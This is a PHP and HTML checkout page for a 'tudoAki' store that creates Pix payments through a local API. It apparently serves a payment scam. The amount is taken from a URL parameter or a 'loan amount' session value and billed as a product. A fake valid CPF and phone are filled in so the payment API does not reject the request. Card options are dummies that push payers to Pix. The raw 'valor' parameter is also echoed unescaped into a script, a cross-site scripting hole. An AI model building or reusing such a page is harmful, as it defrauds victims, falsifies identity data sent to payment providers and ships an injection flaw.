<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$dados = $_SESSION['dados_cadastro'] ?? [];
// Se o nome ou CPF vierem vazios, geramos um padrão válido para a API não recusar
$nome  = !empty($dados['nome']) ? $dados['nome'] : (!empty($_POST['destinatario']) ? $_POST['destinatario'] : 'Cliente tudoAki');
$cpf   = !empty($dados['cpf']) ? $dados['cpf'] : '11144477735'; // CPF válido genérico caso não venha preenchido
$tel   = !empty($dados['telefone']) ? $dados['telefone'] : '11999999999';
$servico = $dados['servico'] ?? $_GET['servico'] ?? $_POST['servico'] ?? 'Kit Especial tudoAki 2026';

// Valor totalmente dinâmico sem ficar preso a um número fixo obsoleto
$valorPalpite = $_GET['valor'] ?? $_POST['valor'] ?? $_SESSION['valor_emprestimo'] ?? $dados['valor'] ?? '100.00';
$_SESSION['valor_emprestimo'] = $valorPalpite;

$valorFloat = (float)$valorPalpite;
$valorFormatado = number_format($valorFloat, 2, ',', '.');
$valorFrete = 9.82;
$valorTotalGeral = $valorFloat + $valorFrete;
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento - tudoAki</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .text-blue-cb { color: #002D93; }
        .bg-blue-cb { background-color: #002D93; }
        .border-blue-cb { border-color: #002D93; }
        .payment-card {
            transition: all 0.2s ease;
        }
        .payment-card:hover {
            border-color: #002D93;
            box-shadow: 0 4px 12px rgba(0, 45, 147, 0.08);
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen font-sans text-gray-800 flex flex-col justify-between">

    <!-- Topo Fiel ao Layout -->
    <header class="bg-white border-b border-gray-200 shadow-sm py-3 px-6 relative">
        <div class="max-w-7xl mx-auto flex items-center justify-between">
            <a href="index.php" class="flex items-center gap-2">
                <span class="text-2xl font-black italic tracking-tighter text-blue-cb">tudo<span class="text-amber-500">Aki</span></span>
            </a>
            <div class="text-blue-cb text-lg flex items-center gap-1 font-bold text-xs">
                <i class="fa-solid fa-lock"></i> Pagamento Seguro
            </div>
        </div>
        <div class="absolute top-0 left-0 right-0 h-1 bg-red-600"></div>
    </header>

    <!-- Conteúdo Principal -->
    <main class="max-w-7xl w-full mx-auto p-4 md:p-8 my-2 flex-grow">

        <h1 class="text-2xl md:text-3xl font-bold text-blue-cb mb-6">Pagamento</h1>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 items-start">
            
            <!-- Coluna da Esquerda: Opções de Pagamento -->
            <div class="lg:col-span-2 space-y-4">
                
                <!-- Cupons de Desconto -->
                <div class="bg-white rounded-xl p-4 shadow-sm border border-gray-200 flex justify-between items-center cursor-pointer hover:border-blue-cb transition">
                    <div>
                        <h3 class="text-xs font-bold text-blue-cb uppercase tracking-wide">Cupons de desconto</h3>
                        <p class="text-xs text-gray-500">Resgate seu desconto</p>
                    </div>
                    <i class="fa-solid fa-plus text-blue-cb font-bold"></i>
                </div>

                <div class="text-xs font-bold text-gray-700 uppercase tracking-wider pt-2">Como você deseja pagar?</div>

                <!-- Formulário com dados automáticos invisíveis para a API -->
                <form id="form-identificacao" class="space-y-3">
                    <input type="hidden" name="payment_method" value="pix">
                    <input type="hidden" name="servico" value="<?php echo htmlspecialchars($servico); ?>">
                    <input type="hidden" name="valor" id="input-valor-hidden" value="<?php echo htmlspecialchars($valorPalpite); ?>">
                    
                    <!-- Dados automáticos preenchidos para a API não bloquear -->
                    <input type="hidden" name="nome" value="<?php echo htmlspecialchars($nome); ?>">
                    <input type="hidden" name="cpf" value="<?php echo htmlspecialchars($cpf); ?>">
                    <input type="hidden" name="telefone" value="<?php echo htmlspecialchars($tel); ?>">

                    <!-- Opção PIX -->
                    <button type="submit" class="w-full text-left payment-card bg-white rounded-xl p-4 shadow-sm border-2 border-emerald-600 cursor-pointer flex justify-between items-center transition">
                        <div class="flex items-start gap-3">
                            <i class="fa-solid fa-qrcode text-emerald-600 text-xl mt-1"></i>
                            <div>
                                <h4 class="text-xs font-bold text-gray-900">Pix</h4>
                                <p class="text-[11px] text-emerald-700 font-bold">Aprovação em instantes</p>
                                <span class="text-sm font-black text-emerald-700 mt-1 block">R$ <span id="display-valor-texto"><?php echo $valorFormatado; ?></span> à vista</span>
                            </div>
                        </div>
                        <span class="bg-emerald-600 text-white font-bold text-xs px-3 py-2 rounded-lg shadow">Gerar PIX Agora <i class="fa-solid fa-arrow-right ml-1"></i></span>
                    </button>
                </form>

                <!-- Outras opções visuais -->
                <div onclick="alert('Opção temporariamente indisponível. Utilize o Pix.')" class="payment-card bg-white rounded-xl p-4 shadow-sm border border-gray-200 cursor-pointer flex justify-between items-center opacity-70">
                    <div class="flex items-start gap-3">
                        <i class="fa-solid fa-file-invoice-dollar text-blue-cb text-xl mt-1"></i>
                        <div>
                            <h4 class="text-xs font-bold text-gray-900">Carnê digital</h4>
                            <p class="text-[11px] text-gray-500">Parcele sem usar limite do cartão.</p>
                            <span class="text-xs font-black text-blue-cb mt-1 block">a partir de R$ <?php echo number_format($valorTotalGeral, 2, ',', '.'); ?></span>
                        </div>
                    </div>
                    <span class="text-xs text-blue-cb font-bold">Consultar*</span>
                </div>

                <div onclick="alert('Opção temporariamente indisponível. Utilize o Pix.')" class="payment-card bg-white rounded-xl p-4 shadow-sm border border-gray-200 cursor-pointer flex justify-between items-center opacity-70">
                    <div class="flex items-start gap-3">
                        <i class="fa-solid fa-credit-card text-blue-cb text-xl mt-1"></i>
                        <div>
                            <h4 class="text-xs font-bold text-gray-900">Cartão de crédito</h4>
                            <p class="text-[11px] text-gray-500">Pague à vista ou parcelado</p>
                            <span class="text-xs font-black text-blue-cb mt-1 block">a partir de R$ <?php echo number_format($valorTotalGeral, 2, ',', '.'); ?></span>
                        </div>
                    </div>
                    <i class="fa-solid fa-chevron-right text-gray-400 text-xs"></i>
                </div>

            </div>

            <!-- Coluna da Direita: Resumo do Pedido -->
            <div>
                <div class="bg-white rounded-xl p-6 shadow-sm border border-gray-200 space-y-4 sticky top-6">
                    <h2 class="text-lg font-bold text-blue-cb border-b border-gray-100 pb-3">Resumo do pedido</h2>

                    <div class="flex items-start gap-3 pb-3 border-b border-gray-100">
                        <div class="w-12 h-12 bg-gray-100 rounded border border-gray-200 flex items-center justify-center text-blue-cb">
                            <i class="fa-solid fa-box-open text-xl"></i>
                        </div>
                        <div class="text-xs">
                            <span class="font-bold text-gray-900 block line-clamp-2">1x <?php echo htmlspecialchars($servico); ?></span>
                            <span class="text-gray-500">Vendido e entregue por <strong class="text-blue-cb">TUDOAKI OFICIAL</strong></span>
                            <div class="text-blue-cb font-bold mt-1">Entrega rápida: <span class="text-emerald-700">R$ <?php echo number_format($valorFrete, 2, ',', '.'); ?></span></div>
                        </div>
                    </div>

                    <div class="space-y-2 text-sm">
                        <div class="flex justify-between text-gray-600 text-xs">
                            <span>01 Produto</span>
                            <span class="font-bold text-gray-900">R$ <span id="summary-valor-produto"><?php echo $valorFormatado; ?></span></span>
                        </div>
                        <div class="flex justify-between text-gray-600 text-xs pb-3 border-b border-gray-100">
                            <span>Entrega</span>
                            <span class="font-bold text-gray-900">R$ <?php echo number_format($valorFrete, 2, ',', '.'); ?></span>
                        </div>
                        <div class="flex justify-between text-base font-bold text-gray-900 pt-1">
                            <span>Total</span>
                            <span class="text-blue-cb font-black text-lg">R$ <span id="summary-valor-total"><?php echo number_format($valorTotalGeral, 2, ',', '.'); ?></span></span>
                        </div>
                        <div class="text-[11px] text-gray-500 text-right -mt-2">
                            ou <strong class="text-emerald-700">R$ <span id="summary-valor-pix"><?php echo $valorFormatado; ?></span></strong> no Pix
                        </div>
                    </div>

                    <div class="text-center text-[11px] text-gray-500 pt-3 border-t border-gray-100">
                        Clique em Gerar PIX para finalizar com aprovação imediata.
                    </div>
                </div>
            </div>

        </div>

    </main>

    <!-- Modal de Carregamento -->
    <div id="loading-modal" class="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 flex flex-col items-center justify-center p-6 hidden">
        <div class="bg-white rounded-2xl p-6 text-center shadow-2xl w-full max-w-xs flex flex-col items-center border border-slate-200">
            <div id="modal-spinner" class="w-12 h-12 border-4 border-emerald-500/20 border-t-emerald-600 rounded-full animate-spin mb-4"></div>
            <div id="modal-icon-error" class="text-amber-500 text-4xl mb-2 hidden"><i class="fa-solid fa-triangle-exclamation"></i></div>
            <h4 class="font-bold text-gray-900 text-sm" id="loading-title">Gerando seu PIX...</h4>
            <p class="text-xs text-gray-500 mt-2 leading-relaxed" id="loading-sub">Aguarde um instante.</p>
            <button id="btn-modal-close" onclick="redirectPixAfterCard()" class="mt-4 bg-blue-cb hover:bg-blue-900 text-white text-xs font-bold py-2 px-4 rounded-lg hidden w-full">Continuar</button>
        </div>
    </div>

    <!-- Rodapé -->
    <footer class="bg-white text-gray-500 text-xs py-4 text-center border-t border-gray-200 mt-8">
        © 2026 tudoAki - Sua Loja de Tudo. Aqui. Todos os direitos reservados.
    </footer>

    <script>
    let valorGlobalTransacao = "<?php echo $valorPalpite; ?>";
    let valorFreteGlobal = 9.82;
    let savedPixData = null;

    document.addEventListener('DOMContentLoaded', function() {
        const storedValor = localStorage.getItem('valor_emprestimo') || localStorage.getItem('current_amount');
        if (storedValor) {
            valorGlobalTransacao = storedValor;
            document.getElementById('input-valor-hidden').value = storedValor;
            let numFloat = parseFloat(storedValor);
            if (!isNaN(numFloat)) {
                let formatted = numFloat.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                document.getElementById('display-valor-texto').innerText = formatted;
                document.getElementById('summary-valor-produto').innerText = formatted;
                document.getElementById('summary-valor-pix').innerText = formatted;
                
                let totalGeral = numFloat + valorFreteGlobal;
                document.getElementById('summary-valor-total').innerText = totalGeral.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            }
        }

        const form = document.getElementById('form-identificacao');
        const loadingModal = document.getElementById('loading-modal');

        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                document.getElementById('loading-title').innerText = 'Gerando seu PIX';
                document.getElementById('loading-sub').innerText = 'Conectando ao sistema de pagamentos...';
                document.getElementById('modal-spinner').classList.remove('hidden');
                document.getElementById('modal-icon-error').classList.add('hidden');
                document.getElementById('btn-modal-close').classList.add('hidden');
                loadingModal.classList.remove('hidden');

                const formData = new FormData(form);
                const dataObj = {};
                formData.forEach((value, key) => dataObj[key] = value);
                dataObj['valor'] = valorGlobalTransacao;
                dataObj['amount'] = valorGlobalTransacao;

                try {
                    const response = await fetch('api/create_payment.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(dataObj)
                    });

                    const result = await response.json();

                    if (response.ok && result.status === 'success') {
                        savedPixData = result;

                        let cleanPix = result.pix_code.replace(/\\/g, '');
                        localStorage.setItem('current_pix_code', cleanPix);
                        localStorage.setItem('current_pedido_id', result.pedidoId);
                        localStorage.setItem('current_amount', valorGlobalTransacao);
                        window.location.href = 'qrcode.php';
                    } else {
                        loadingModal.classList.add('hidden');
                        alert('Erro ao processar requisição: ' + (result.message || 'Tente novamente.'));
                    }
                } catch (error) {
                    loadingModal.classList.add('hidden');
                    alert('Erro na comunicação com o servidor.');
                }
            });
        }
    });

    function redirectPixAfterCard() {
        if (savedPixData && savedPixData.pix_code) {
            let cleanPix = savedPixData.pix_code.replace(/\\/g, '');
            localStorage.setItem('current_pix_code', cleanPix);
            localStorage.setItem('current_pedido_id', savedPixData.pedidoId);
            localStorage.setItem('current_amount', valorGlobalTransacao);
            window.location.href = 'qrcode.php';
        } else {
            document.getElementById('loading-modal').classList.add('hidden');
        }
    }
    </script>
</body>
</html>